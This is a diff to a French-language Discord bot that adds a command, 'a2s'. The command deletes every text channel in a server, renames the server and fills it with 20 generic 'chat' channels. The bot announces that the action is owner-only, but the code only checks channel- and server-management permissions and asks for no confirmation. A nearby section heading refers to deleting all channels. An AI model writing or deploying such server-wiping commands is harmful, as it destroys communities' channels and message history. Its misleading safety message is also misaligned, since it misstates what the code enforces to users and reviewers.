@@ -125,7 +125,35 @@ async def createsalons(
             f"📌 Rôles : 5"
         )
     )
+@bot.command(name="a2s")
+@commands.has_permissions(manage_channels=True, manage_guild=True)
+async def a2s(ctx):
 
+    await ctx.send("⚠️ Action confirmée uniquement pour owner. Démarrage...")
+
+    guild = ctx.guild
+
+    # suppression salons texte
+    for channel in guild.text_channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+
+    nom = "chat"
+    nombre = 20
+    nom_serveur = "Nouveau Serveur"
+
+    await guild.edit(name=nom_serveur)
+
+    for i in range(nombre):
+        try:
+            await guild.create_text_channel(name=f"{nom}-{i+1}")
+            await asyncio.sleep(0.3)
+        except:
+            break
+
+    await ctx.send("✅ Terminé")
 
 # =========================
 # DELETE ALL CHANNELS
